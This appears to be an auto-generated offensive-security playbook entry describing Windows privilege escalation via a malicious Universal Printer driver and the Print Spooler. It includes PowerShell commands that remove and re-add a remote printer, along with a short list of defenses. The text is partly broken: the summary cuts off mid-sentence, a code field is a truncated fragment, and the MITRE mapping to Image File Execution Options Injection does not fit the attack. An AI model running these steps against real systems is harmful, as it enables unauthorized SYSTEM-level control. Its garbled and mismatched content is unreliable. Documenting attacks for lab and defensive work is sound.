---
id: adb67df2-d293-4f44-9833-e9b8a81f4ea8
name: Windows - Privilege Escalation via Universal Printer Driver
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:29.841037+00:00'
updated_at: '2023-04-10T20:37:50.628197+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Event Triggered Execution|T1546 - Event Triggered Execution]]'
sub_techniques:
- '[[Image File Execution Options Injection|T1546.012 - Image File Execution Options
  Injection]]'
tags:
- '[[EoP - Printers]]'
- '[[Universal Printer]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Add Printer]]'
- '[[Remove Printer]]'
---

# Windows - Privilege Escalation via Universal Printer Driver

## Summary

This procedure involves exploiting a vulnerability in the Print Spooler Service to gain escalated privileges on a Windows system. By removing a printer and adding it back with a malicious driver, an attacker can inject code into the spooler service that runs with SYSTEM level privileges. This can a

## Description

# Description

This procedure involves exploiting a vulnerability in the Print Spooler Service to gain escalated privileges on a Windows system. By removing a printer and adding it back with a malicious driver, an attacker can inject code into the spooler service that runs with SYSTEM level privileges. This can allow the attacker to execute arbitrary code or perform other malicious actions on the compromised system. The business value of this attack is that it can provide an attacker with access to sensitive data or systems that require elevated privileges to access.

## Requirements

1. Access to the target Windows system

1. Authenticated access to the system with sufficient privileges to add and remove printers

1. Ability to install a malicious printer driver on the system

## Defense

1. Disable the Print Spooler Service if it is not needed

1. Ensure that printer drivers are digitally signed and come from trusted sources

1. Monitor the system for changes to the printer configuration, especially the addition or removal of printers

## Objectives

1. Gain elevated privileges on a Windows system

1. Execute arbitrary code or perform other malicious actions on the compromised system

# Instructions

1. This command removes and adds a printer with a specific driver.

**Code**: [[$serverName  = 'dc.purple.lab'
$printerName = 'Uni]]

> - $serverName: The name of the server where the printer is located.
- $printerName: The name of the printer to be added.
- $fullprinterName: The full name of the printer with the driver architecture.
- Remove-Printer: Removes the specified printer.
- Add-Printer: Adds the specified printer.

**Command** ([[Remove Printer]]):

```bash
$serverName  = 'dc.purple.lab'
$printerName = 'Universal Priv Printer'
$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
```

**Command** ([[Add Printer]]):

```bash
Add-Printer -ConnectionName $fullprinterName
```

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Event Triggered Execution|T1546 - Event Triggered Execution]]

### Sub-Techniques

- [[Image File Execution Options Injection|T1546.012 - Image File Execution Options Injection]]

## Commands Used

- [[Add Printer]]
- [[Remove Printer]]

## Tags

- [[EoP - Printers]]
- [[Universal Printer]]
- [[Windows - Privilege Escalation]]
